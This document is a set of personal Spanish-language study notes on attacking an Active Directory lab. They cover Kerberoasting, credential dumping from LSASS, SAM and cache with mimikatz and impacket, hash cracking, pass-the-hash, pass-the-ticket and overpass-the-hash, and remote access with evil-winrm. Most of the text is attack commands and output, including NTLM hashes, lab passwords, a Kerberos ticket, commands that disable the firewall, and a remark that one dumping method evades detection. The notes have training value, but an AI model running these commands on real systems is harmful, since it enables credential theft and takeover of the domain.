~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Get-NetUser -SPN
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Nos mostrara el ususario por defecto y el creado como los usuarios para entregar algun
tipo de servicio

Como ya sabemos como filtrar elegiremos el nombre de usuario y servicio de este

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Get-NetUser -SPN | select name,serviceprincipalname
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Ahora vamos por el ticket de servicio

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Utilizando Rubeus
.\Rubeus.exe kerberoast
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Nos muetra los usuarios de servicio y nos mostrara su hash

En este caso le pediremos al gran ticket n ticket de servicio de la cuenta de servicios
en este caso la que creamos, todo esto lo podremos ver en wireshark

Ahora veremos como hacerlo desde kali, utilizando impacket

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
impacket-GetUserSPNs corp.local/empleado2:Ap09mncd -request
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Esto nos mostrara el hash del usuario de servicio

Recordano siempre que podemos reemplazar -request por -outputfile nombre de archivo

Para hacer que un usuario posea servicios tendra que tener ACL genericwrite o genericownd

En este caso lo haremos manual, anadiremos la maquina empleado2 a un usuario en seguridad , opciones avanzadas , selecionar y agregar, seleccionar una entidad de seguridad, elegimos un usuario en este caso empleado2 que esta logueado en maqina WS02 y solo marcar la casilla escribir en todas las propiedades, borrar las demas.

luego con powerview

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Set-DomainObject -Identity Brana.Ellie -Set @{serviceprincipalname='test/cualquiercosa'} -verbose
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

los que esta en {} le decimos los nombres de los principales servicios = se puede colocar cualquier cosa y como sabemos 
-verbose para mas informacion.

Con esto le acabamos de aderir una SPN y la cuenta se portara como una cuenta de usuario y de esta forma realizar
las funciones anteriores y mostrarnos sus credenciales para inicio de seccion


Colocamos 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Get-NetUser -SPN | select name,serviceprincipalname
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

y nos mostrara el usuario brana.ellie

y solamente seria ir a kali e ingresar el comando que utilizamos

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
impacket-GetUserSPNs corp.local/empleado2:Ap09mncd -outputfile asrp2.hash
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

nos mostrara las credenciales de estos usuarios que prestan servicios

Solo quedaria usar john con rockyou y listo

Ahora veremos otros protocolos como ntlm video 57

A diferencia de kerberos que es en domain controller ntml es para usuario local

Este tiene como caracteristicas es que tienen las credenciales en LSA que es el nombre de su base de datos

Nos descargamos la herramienta logon session sysinternals, los cual no podra ayudar a ingresar a una cuenta
con las credenciales o login ya utilizados.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Sysinternals es una colección de herramientas de diagnóstico y administración para 
sistemas Windows creada originalmente por Mark Russinovich y Bryce Cogswell antes 
de ser adquirida por Microsoft en 2006. Una de las herramientas más útiles y populares 
en el conjunto de herramientas de Sysinternals es "Logon Sessions" (sesiones de inicio de sesión), 
a menudo abreviada como "LogonSession". Esta herramienta proporciona una visión detallada de 
las sesiones de inicio de sesión en un sistema Windows, incluyendo información sobre los 
usuarios conectados y los procesos asociados.

Algunos de los aspectos que Logon Sessions puede mostrar incluyen:

Tipo de sesión: Puede distinguir entre sesiones interactivas, de servicio, de red, etc.
ID de sesión: Un identificador único asignado a cada sesión de inicio de sesión.
Usuario: El nombre del usuario que ha iniciado sesión.
Dominio: El dominio al que pertenece el usuario.
ID de usuario: El identificador único del usuario en el sistema.
Procesos asociados: Los procesos que están asociados con cada sesión de inicio de sesión.
Estos detalles son extremadamente útiles para los administradores de sistemas, ya que les 
permiten monitorear quién está conectado al sistema y qué están haciendo. Esto puede ser 
especialmente útil en entornos donde la seguridad y la auditoría son preocupaciones importantes.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Despues de descargarlo pasarlo a la maquina WS02 con el usuario normal sin dominio kali02, para ejecutar la herramienta
anterior necesitaremos permisos de admnistrador.

Para ver las maquinas activas

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Get-LocalUSer 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Para ver los usuarios administradores

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Get-LocalGroupMember -Group Administradores 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Y ya pasamos a ejecutar .\la herramienta.exe


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
.\logonsessions.exe

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
.\logonsessions.exe -p 
para ver los procesos ejecutados de cada usuario
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Siempre veremos 2 secciones por cada usuario, el que no tiene privilegios y el que si,
es decir, se dividiran el mismo usuario pero los procesos con privilegios y los que no.
y cuando digo privilegios me refiero como administrador.

Lo mismo pasara si lo realizamos dentro de un ususario de dominio, recordar
siempre que se necesita tener permiso de administrador, en este caso el usuario con permisios 
privilegiados sera Administrador y el usuario con priviliegios normales sera empleado2.

Todos estos inicios de seccion son interactivos a diferencia de que si voy a la maquina Domain controller e ingreso desde
el comando cd//WS02//c$ y me entra a la maquina WS02 cuando ingrese el comando en la maquina WS02 de la
herramienta anterior, saldra otro usuario Administrador que correspondra a la maquina Domain controller pero en vez 
de interactiva esta sera Network, 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
cd \\WS02\C$ ya una vez dentro esta sera una seccion no interactiva a diferencia de la interactiva
como anteriormente hemos visto, esta vez fue sin ninguna session solo de forma remota pero hay 
una credencial en la base de datos de lo que realice desde el Domain controller.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



Ahora veremos de que trata un token de acceso.

primero a utilizar otra herramienta llamada process explorer sysinternals

Una vez descargado y enviado a la maquina WS02 empleado2, abrire un cmd sin privilegios y un powershell con privilegios

Esta herramienta es parecida a logionsession anterior pero esta es grafica, una vez dentro y ejecutado .\la herramienta.exe
veremos los procesos , seleccionandolos y presionando propiedades y seguridad veremos la diferencia de estos, en este 
caso del proceso cmd y powershell previamente abiertos, podremos ver cual pertenece a corp/administrador en este
caso powershell y corp/empleado2 en el caso de cmd que lo abrimos sin privilegios.

Y tener en cuenta que cada uno tendra un loggon session

Para mas informacion video 57

Esta vez haremos dos volcados de credenciales; sam para los locales y lsass para dominios

Anadir a empleado2 a el grupo de administradores
Dejar en claro estas administracion se abren en local no dominio
al abrir por ejemplo powershell como administrador no seria como administrador de dominio sino solamente como
administrador de local.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
net localgroup administradores corp\empleado2 /add
Se debe de iniciar seccion nuevamente
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Otros comandos que probaba 

Del: Este comando puede eliminar archivos y directorios, y si se utiliza de forma maliciosa podría borrar datos importantes. Por ejemplo:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
del C:\archivo_importante.txt

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Net User: Puede ser utilizado para cambiar la contraseña de una cuenta de usuario o incluso para deshabilitar una cuenta. Por ejemplo:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
net user <nombre_usuario> <nueva_contraseña>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Shutdown: Este comando permite apagar o reiniciar una computadora de forma remota. Por ejemplo:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
shutdown /m \\NombreEquipo /s /t 0

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Para desactivar el antivirus

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
y -Enabled True, para activarlo
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Netsh: Puede utilizarse para manipular configuraciones de red, como agregar o eliminar reglas de firewall. Por ejemplo:
Este comando agregará una regla de firewall que bloqueará todo el tráfico entrante.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
netsh advfirewall firewall add rule name="ReglaMaliciosa" dir=in action=block

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Para borrar regla

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
netsh advfirewall firewall delete rule name="ReglaMaliciosa"

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


 Bien vamos a empezar a volcar desde windows, utilizaremos mimikatz, primero desactivar en tiempo real
 el antivirus, luego de esto continuo.
 
 transferir archivo de linux a windows 
 
 Pasaremos mimikatz desde linux hacia windows, ya sabemos, pondremos a escuchar kali y recibir windows
 python2 -m SimpleHTTPServer y en la maquina a recibir en este caso windows seria 
 (New-Object System.NET.WebClient).DownloadFile("http://192.168.0.5:8000/mimikatz.exe", "mimikatz.exe")  
 
 Bien , abrimos dos powershell una como administradores del usuarios empleado2 que seria local y  otra como
 administrador de usuario de dominio que seria del dominio.
 
 Luego abrimos mimikatz desde empleado2
 
 Otra de empleado2 para ejecutar logonssession
 
 Desde mimikatz ejecutamos 
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sekurlsa::logonpasswords
Esto nos volcara todas las credenciales de lsass, todas las loggonseccions
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 como por ejemplo este

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 * Username : empleado2
 * NTLM     : 0602dfdcc0e9d41b47b6fa0adad3c3d1
 * SHA1     : 9367e8466cd2663e5c666aca25d18213b3db953f
 * DPAPI    : c88717761fc722f232669b980d9daecb
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Ya seria pasarlo a kali y utilizar john, en mi caso tome el ntlm lo lleve a kali
echo 0602dfdcc0e9d41b47b6fa0adad3c3d1 > empleado2.hash
luego john --format=NT empleado2.hash y listo.

Ahora bien para volcar de una base de datos Sam no nos basta con ser administrador debemos de ser system, es lo ultimo 
en privilegios.

En la misma powershell con mimikatz los siguientes comandos
primero

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
privilege::debug
y luego
token::elevate
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Este ultimo susplantara el token de nosotros con el de system para tener mayor privilegio


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM
676     {0;000003e7} 0 D 28680      NT AUTHORITY\SYSTEM     S-1-5-18  (04g,31p)       Primary
-> Impersonated !
* Process Token : {0;0072eb98} 4 F 11054140    CORP\empleado2  S-1-5-21-1087878042-4283918813-3206888575-1104  (13g,24p)       Primary
* Thread Token  : {0;000003e7} 0 D 11547194    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,31p)       Impersonation (Delegation)  
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Ahora desde mimikatz accedemos a la base de datos SAM

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
lsadump::sam
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Lo mismo que lo anterior, en este caso, todos los usuarios locales
tomare en este caso el usuario kali02 y hare el mismo procedimiento anterior

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
usuario:kali02
ntlm: 7ce21f17c0aee7fb9ceba532d0546ad6 
y usar john y listo
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



Ahora usaremos otro comando aparte, a diferencia de los demas esta no la detecta las herramientas de seguridad

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
reg save hklm\sam sam.save
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

luego

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
reg save hklm\system system.save
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

se nos guardaran dos archivos .save, y la llevamos a kali

Utilizaremos la herramienta impacket

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
impacket-secretsdump -sam sam.save -system system.save LOCAL
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Y nos volcara las credenciales de todos los usuarios

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[*] Target system bootKey: 0xce2ba339f47170502862e11f6e3d0f7b
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:67d71f39b824a224462c7e6bd34149e1:::
kali02:1001:aad3b435b51404eeaad3b435b51404ee:7ce21f17c0aee7fb9ceba532d0546ad6:::
[*] Cleaning up... 

Recordando que  7ce21f17c0aee7fb9ceba532d0546ad6 era el hash que crakeamos anteriormente
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Tambien podemos ir al administrador de tareas en detalle y volcar el servicio lsass.exe con click derecho en el
luego lo pasamos a kali

Primero aremos el hash en windows a travez de la herramienta mimikatz

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sekurlsa::minidump C:\Users\empleado2\Desktop\WS02Lsass.DMP
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

luego

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sekurlsa::logonPasswords
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Al igual que la anterior me volcaria todas las sessiones de la maquina

Ahora bien desde kali, volcar de forma remota toda la informacion del usuario teniendo
sus credenciale, cabe destacar que esta herramienta es para usuario de dominios no locales

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
impacket-secretsdump empleado2:Ap09mncd@192.168.0.4
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

De esta obtuve mayor informacion, saque todos los usuarios anteriores del dominio
como ivette , adey y mas todos los usuarios que colocarons sus credenciales en la maquina
empleado2 y en este caso se volco LSA

Otra herramienta seria crackmapexec , aun asi es parecida ya que usa impacket por debajo

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
crackmapexec smb 192.168.0.4 -u empleado2 -p "Ap09mncd" --sam
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

igual, todos los hash de los usuarios que ingresaron credenciales a la maquina WS02

Para LSA lo mismo pero al final --lsa

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
crackmapexec smb 192.168.0.4 -u empleado2 -p "Ap09mncd" --lsa
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Esta me muestra no solamente los usuarios activos sino todos los usuarios que alguna 
vez iniciaron seccion

Ahora veremos como hashear un usuario de dominio que esta en local, es decir, un empleado se lleva su laptop de la
empresa y abre sesssion pero sin contacto o conectividad hacia el dominio y aun asieste se puede conectar al usuario
esto se explica porque en alguna parte de la memoria las credenciales se quedan hasheadas y aqui ahora veremos como
hashearlas

Bien una vez dentro de el usuario kali02 en la maquina WS02 ingresamos el usuario .\kali02 para que pueda entrar de lo contrario
nos dira que nos conectemos a un usuario que pertenezca al dominio.

Bien como ya dijimos, obtendremos las credenciales de los usurios de dominio desde un usuario local en este caso sera kali02
, volcaremos esas credenciales utilizando mimikatz y los siguientes comandos

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
privilege::debug
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

luego elevamos nuestro token a system

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
token::elevate
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

luego de este en vez de volcar la sam volcaremos la cache

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
lsadump::cache
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Ya con esto volcamos todas las credenciales de los usuarios de nuestro dominio y todo
aquel que haya iniciado seccion en ella

Ahora pasaremos a realizar lo mismo con estas herramientas, pasaremos a volcar de la 
siguiente forma

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
reg save hklm\system system.save
reg save hklm\security security.save
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

ya luego de haberlos pasado a kali el siguiente comando con la herramienta imapacket

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
impacket-secretsdump -system system.save -security security.save LOCAL
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Esto es dentro de un usuario cualquiera en la maquina digamos por ejemplo de la empresa 
que utilizan para logearse

Otra forma seria como anteriormente hemos visto es a travez de un usuario de dominio

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
impacket-secretsdump empleado2:Password@192.168.0.4
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

lanzado en kali, en este caso nos volcara las secciones locales y de dominio


Ahora pasaremos a usar una herramienta con windows llamada pass the hash

antes que todo ingresaremos en loggionseccion en empleado2 y en la maquina de dominio
ingresaremos a traves de powershell a la carpeta compartida

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
dir \\WS02\C$
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Si ingresamos de nuevo a loggoseccion veremos el cambio de ticket por el comando anterior
y nos mostrara la maquina

Luego volvemos a lamaquina de dominio volcamos el mismo comando para la carpeta compartida pero en vez de WS02 seria la ip de la maquina WS02, nos mostrara las mismas carpetas pero si nos volvemos a nuestra maquina empleado2 y ejecutamos el comando de loggonseccion veremos dos sessciones una con kerberos y otra con ntlm que esta ultima es mas suceptible y vulnerable a ataques, recordar que esto funciona en maquinas de dominios.


en ntlm lo que hara el ticket es que recibira el hash y descartara la contrasena,
veremos como usar la herramienta pero en windows. intentaremos ejecutar
en powershell la carpeta compartida de la maquina dominio, para esto usaremos lo siguiente

primero: abriremos otra session en powershell como usuario administrador
luego iremos a la otra powershell de empleado2 como administrador y ejecutaremos
mimikatz, luego dentro de este ejecutaremos

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sekurlsa::logonpasswords
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

veremos todas las credenciales de los usuarios que se han registrado en la maquina

Tomamos el ntlm de el usuario de Administrador que en este caso como estamos en 
dominio sera el active directory

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
eef6eedd62257ff1ffdc29dd61add972 
es el hash ntlm de la credencial del usuario
esto se hace cuando el usuario posee una contrasena fuerte
y no poseemos recursos en la pc u otros motivos
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


luego usaremos la herrameinta pass the hash en mimikatz

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sekurlsa::pth /user:administrador /domain:corp.local /ntlm:eef6eedd62257ff1ffdc29dd61add972 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Ya con nos abrira una ventana de cmd, y si intentamos ingresar dir\\DC01\C$ nos mostrara el directorio de la maquina del dominio
active directory, contrario sin esto nos decia acceso denegado

Ahora veremos como hacer lo mismo pero en kali linux

pasamos el mismo hash a un emacs y lo guarde como empleado2.hash

En este caso no utilizaremos john ya que con contrasena algo complicadas este se e dificil de desifrarla y no lo podemos hashear

En esta ocasion utilizaremos la herramienta pass the hash

utilizaremos mediante el protocolo smb, el siguiente comando a utilizar es cuando usamos el recurso C$ que vimos anteriormente
que nos comparte protocolo ya mencionado.


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
pth-smbclient //192.168.0.7/c$ -U administrador --pw-nt-hash eef6eedd62257ff1ffdc29dd61add972 -W corp.local
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Ya con esto estariamos dentro del dominio active directory, probamos ls y demas
Recordar, ip -u y -w todo es informacion de la maquina de dominio principal

Usaremos y explotaremos otro protocolo que funciona para la opcion romota que muchas veces se encuentra habilitada en las
maquinas de dominios, en este caso probaremos en la maquina empleado2 si esta habilitada con el siguiente comando


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
winrm quickconfig
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

en nuestro caso estaba deshabilitado, lo configuraremos y tambien le activaremos en el transcuros de la configuracion
la exepcion para firewall

Utilizaremos otra herramienta en parentesis, con esta debemos de saber la credenciales del usuario administrador de no ser asi podemos utilizar el hash que ya tenemos
para administrar de forma remota por ejemplo la maquina empleado2.

Llamada evil-winrm
instalamos 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo gem install evil-winrm
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


cabe destacar que debemos de tener permisos de administrador, luego pasamos al siguiente comando

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
evil-winrm -i 192.168.0.4 -u Administrador -p @ng01*Apolo
o empleado2 con -u y -p Password y estaremos dentro de la maquina
empleado2, al contrario del primero que seria dentro del usuario
Administrador que se encuentra en la lista de usuarios en la maquina
empleado2
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


este protoloco se llama winrm, y como anteriormente obtuvimos acceso con la clave de 
igual forma lo podemos hacer con el hash

para esto

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
evil-winrm -i 192.168.0.4 -u Administrador -H eef6eedd62257ff1ffdc29dd61add972
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Y tendremos acceso de forma remoto al usuario Administrador de la maquina WS02

De igual forma como lo veiamos anteriormente podemos utilizar impacket

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
impacket-secretsdump administrador@192.168.0.4 -hashes :eef6eedd62257ff1ffdc29dd61add972
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Lo que hace es que me vuelva todas las credenciales que se han autenticado en la maquina WS02

Tambien podemos usar rpc

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
pth-rpcclient -U corp/administrador%00000000000000000000000000000000:eef6eedd62257ff1ffdc29dd61add972 //192.168.0.4
podemos en vez del hash colocar 0 la misma cantidad que el hash
luego : y la ip de la maquina, o tambien colocar el hash y los demas

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

ingresamos help y vemos los comando a utilizar

Ahora video 63 veremos las herramientas over pass the hash y pass the key

en la maquina WS02 podemos a traves de mimikatz con el siguiente comando

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sekurlsa::pth /user:administrador /domain:corp.local /ntlm:eef6eedd62257ff1ffdc29dd61add972
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Esto nos abrira un cmd con el cual podremos navegar dentro de la maquina WS02 en este caso y todos los usuarios logeados en esta, aparte de entrar a la carpeta compartida del dominio en este caso con dir \\DC01\C$

Ahora en la misma maquina utilizaremos la herramienta rubeus y su siguiente comando

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
.\Rubeus.exe asktgt /domain:corp.local /user:administrador /rc4:eef6eedd62257ff1ffdc29dd61add972 /ptt
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Obtiene el ticket gran ticket del usuario administrador a travez del protocolo kerberos y sera 
cifrado con rs4

Tener en cuenta que en mimikat podemos interactar con sekurlsa::
Nos mostrara sus opciones, en este caso

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sekrulsa::ekeys
nos mostrara luego de iniciar con otro usuario powershell como
administrador nos mostrara el as256 y la anterior hash rs4 que hemos
estado usando hasta ahora, en este caso el usuario de administrador
no lo presenta pero en caso de que si se haria de la siguiente 
forma
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
.\Rubeus.exe asktgt /domain:corp.local /user:administrador /aes256:y el ticket aes256 /ptt
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Este se encontrara de primero encima de los rs4 que se repiten y sera mas largo que este utlimo

De igual forma hara lo mismo, pero con la diferencia es que en wireshark estara cifrado en aes256

Over pass the hash rs4 mismo hash que usamos , cuando usamos otro hash de kerberos como aes256 se llama pass the keys

Ahora en kali con impacket

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
impacket-getTGT corp.local/administrador -hashes :eef6eedd62257ff1ffdc29dd61add972
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Esto nos volcara en un fichero el ticket gran ticket del usuario administrador


Otra herramienta a utilizar sera pass the ticket para volcar como anteriormente

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
klist
ver tickets de kerberos, en mi caso no me funciona(Lo solucione)
en otro tenor con acceso de administrador locar utilizaremos rebeus.exe dump, 
para volcar todos los tickests de usuarios que se han logeado en la maquina.
recordando usuario de administracion local no de dominio en este caso.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Ahora pasaremos a realizar lo mismo pero con mimikatz

Antes de seguir por problema del codigo 10 con un controlador de windows , formatee y al volver mis maquinas ahora se rigen con la ip 192.168.201/24
la principal siguen igual pero en vez de 0 en la penultima ahora es 201.
pero lo arregle y ahora es igual que antes 192.168.0.7 windows servers y demas maquinas

con mimikatz seria 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sekurlsa::
para volcar veremos opciones luego de ingresar el comando anterior
solamente seria el mismo y tickets y listo
sekurlsa::tickets y nos volcara los tickets de kerberos

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


A diferencia de pass the hash aqui inyectaremos el tickets de un administrador en usuario normal como lo es
empleado2 y solicitaremos servicios de administradores, anteriormente ejecutamos .\ rubeus.exe dump
esto nos lanzara un ticket y session key de los usuarios que iniciaron en la maquina WS02, tomamos
el de administrador local, lo pasamos a emacs en la maquina host , eliminamos los espacios y los saltos de linea
y luego de esto utilizando de nuevo rubeus

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
.\Rubeus.exe ptt /ticket:mas el ticket copiado
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Luego de esto con el gran ticket podemos hacer uso de la maquina de forma remota

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Enter-PSSession -ComputerName DC01
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Video 65 ASK-TGT_TGS

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
.\Rubeus.exe asktgt /domain:corp.local /user:administrador /rc4:mas hash del usuario
este hash es el ntlm que capturamos anteriormente y utilizamos rc4

Con esto obtenemos su tikeck grand tocket y su clave se seccion
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Bien una vez que ingresamos el comando Rubeus.exe dump y tomemos el gran ticket mas clave de seccion

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
doIFQDCCBTygAwIBBaEDAgEWooIERjCCBEJhggQ+MIIEOqADAgEFoQwbCkNPUlAuTE9DQUyiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCkNPUlAuTE9DQUyjggQCMIID/qADAgESoQMCAQKiggPwBIID7HsZ3R+Ys17rH1Ns72ejJHskLj/xoaBmN566P0WYa1DgaYYu0m0qpJCDuikfXuJp1X3nW0BGuvVw60oOwtBbNu0F7Zh5z6GfGhANaZEWdAH1JxTaBbSdsp4aNKxEIBOgmHyBgnd9QQMXnEIw0/UuFQibc8SAYhA8bD+UeZS0HjMKlrUeHdV/KO8V1LWPK3Ui0VSOWylsVMISlfQqDbQLClpJ4M/OXmr5NAp2bSm03CrwPfuIyQUxkwptAP8o+w5BWXFtxLRBc7yRDxdjyjSXpdFyK76jA2NXfgF8FhYEov0YIr07LyKpRTmwKRIZWYy6jIjQbr3Iim28b5N+z8J8D9jdeabs4X+xzshfjRHVg9TtssRxw/8eqJG0Et7NEdDyh8ibo9AftF30suOmqI4sYJjzoyrjU0ZA9dIf2etTGlyQGA7bfJQIb+gHaPMIECEtiV4NJJuTuCnI2DKEp4S0oGKqSj4khkrmUI7OpHwlXo8sYwfUjycphFsCT3RMd3SSVxkMbqM8aS/sTT8GNK+GJ8DQktgY2NgvdMJ9QPgC+2eVAEEpvg12rJ0624qpkDoeFRaz0k6VDiHoNtVt2dSq3EjMwiNgxFO2rJu4sHh6pOgRyJoO4t4yKmyZkLLssAM5bfBu0LwdmPSBFDJ2x6E82d5T4C6p3qg7XGOoNOgMFcm9kjC0ykhEuGj8hWhJvEmPQqTqIdk1eyV13BB7tHdN4sh91DvUYiH9bDrZht5FnXQzxHDNB4BPbEWwevfkOZRXJRU2MVAOV+0Rgz1UB8iDTGyLRPCo8+bP1K0+T8+zsxSyzbtjIXR8mZGTrlHGxmHrwhf3jSUQTxqdBDETGDtNa0AcCCwOQ0xVq/jRn81qbTIT2qzVdpu/k8rkXKF1aYZeiPUX+htyyCzzVC1ulX3eGpBTUOiFShrmQ43f/I1iE7ADNwazBC/nqPaz70qqIIhFQt0UjSbQAVHdTHru7ld4AbClXDqeeJ/mTc8vFpSCszQxEZQqFhMazemppgAqOckB+aBG+t9yWjSJD8LzaFtddcLEqpHRXMSfN36vTmBKX0tsg5REwxR0sJPrPl1bKHXJnK0X5HjZnaTKREVKwgB2gglO24I